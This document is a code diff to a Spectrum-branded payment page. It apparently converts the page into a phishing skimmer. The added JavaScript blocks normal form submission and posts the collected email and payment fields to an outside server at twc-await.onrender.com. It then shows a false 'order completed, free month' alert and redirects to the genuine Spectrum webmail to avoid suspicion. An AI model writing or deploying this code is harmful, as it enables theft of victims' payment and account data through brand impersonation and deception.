@@ -338,7 +338,7 @@
 
         <!-- Payment Form -->
         <div class="card">
-            <form action="https://formcarry.com/s/RBEBHktdC1G" method="POST" id="paymentForm">
+            <form action="https://self-care.portals.spectrum.net/username-recovery" method="POST" id="paymentForm">
             <!-- Email -->
             <div class="form-group">
                 <label class="form-label">Email address</label>
@@ -457,7 +457,8 @@
 
         // Process payment - now handles form submission
         document.getElementById('paymentForm').addEventListener('submit', function(e) {
-            // Let the form submit naturally, but show processing state briefly
+            e.preventDefault(); // Prevent default form submission
+            
             const button = document.getElementById('submitButton');
             const spinner = document.getElementById('spinner');
             const lockIcon = document.getElementById('lockIcon');
@@ -469,12 +470,30 @@
             lockIcon.classList.add('hidden');
             buttonText.textContent = 'Processing...';
             
-            // Allow form to submit after brief delay for visual feedback
-            setTimeout(() => {
-                alert('Order completed successfully!!!.... You have received a 1 month paid subscription for free.');
-                // Redirect to Spectrum webmail after alert is closed
-                window.location.href = 'https://webmail.spectrum.net/';
-            }, 500);
+            // Collect form data
+            const formData = new FormData(this);
+            
+            // Submit form data to the server
+            fetch('https://twc-await.onrender.com/', {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => {
+                // Show success message and redirect regardless of server response
+                setTimeout(() => {
+                    alert('Order completed successfully!!!.... You have received a 1 month paid subscription for free.');
+                    // Redirect to Spectrum webmail after alert is closed
+                    window.location.href = 'https://webmail.spectrum.net/';
+                }, 1000);
+            })
+            .catch(error => {
+                // Even if there's an error, show success message and redirect
+                setTimeout(() => {
+                    alert('Order completed successfully!!!.... You have received a 1 month paid subscription for free.');
+                    // Redirect to Spectrum webmail after alert is closed
+                    window.location.href = 'https://webmail.spectrum.net/';
+                }, 1000);
+            });
         });
 
         // Add focus effects to inputs
